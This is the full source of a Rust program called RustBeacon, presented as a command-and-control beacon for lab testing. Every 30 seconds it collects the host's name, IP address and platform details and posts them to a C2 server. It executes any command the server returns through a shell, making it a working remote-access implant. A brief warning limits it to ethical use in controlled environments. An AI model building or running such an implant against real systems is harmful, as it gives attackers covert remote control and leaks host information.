// RustBeacon - Lightweight C2 beacon for lab testing
// WARNING: FOR ETHICAL USE IN CONTROLLED ENVIRONMENTS ONLY

use std::{thread, time::Duration};
use std::process::Command;
use std::collections::HashMap;
use reqwest::blocking::Client;
use serde::Serialize;

// Data structure for POST payload
#[derive(Serialize)]
struct BeaconPayload {
    hostname: String,
    local_ip: String,
    platform: String,
}

fn get_hostname() -> String {
    let output = Command::new("hostname").output().expect("Failed to get hostname");
    String::from_utf8_lossy(&output.stdout).trim().to_string()
}

fn get_ip() -> String {
    let output = Command::new("hostname")
        .arg("-I")
        .output()
        .expect("Failed to get IP address");
    String::from_utf8_lossy(&output.stdout).trim().split_whitespace().next().unwrap_or("0.0.0.0").to_string()
}

fn get_platform() -> String {
    let output = Command::new("uname").arg("-a").output().expect("Failed to get platform info");
    String::from_utf8_lossy(&output.stdout).trim().to_string()
}

fn send_beacon(client: &Client, c2_url: &str, payload: &BeaconPayload) {
    match client.post(c2_url).json(payload).send() {
        Ok(resp) => {
            if let Ok(text) = resp.text() {
                println!("[*] C2 Response: {}", text);
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) {
                    if let Some(cmd) = json.get("command").and_then(|v| v.as_str()) {
                        if !cmd.is_empty() {
                            println!("[*] Executing command: {}", cmd);
                            //For Windows, replace "sh" "-c" with "cmd" "/C".
                            let output = Command::new("sh")
                                .arg("-c")
                                .arg(cmd)
                                .output()
                                .expect("Command failed");
                            println!("{}", String::from_utf8_lossy(&output.stdout));
                        }
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("[!] Failed to contact C2: {}", e);
        }
    }
}

fn main() {
    let c2_url = "http://127.0.0.1:8080/beacon"; // 🔴 Change to lab C2 URL only
    let interval = Duration::from_secs(30); // Beacon every 30 seconds

    let client = Client::new();

    println!("[*] RustBeacon started. Beaconing to {}", c2_url);

    loop {
        let payload = BeaconPayload {
            hostname: get_hostname(),
            local_ip: get_ip(),
            platform: get_platform(),
        };

        send_beacon(&client, c2_url, &payload);
        thread::sleep(interval);
    }
}
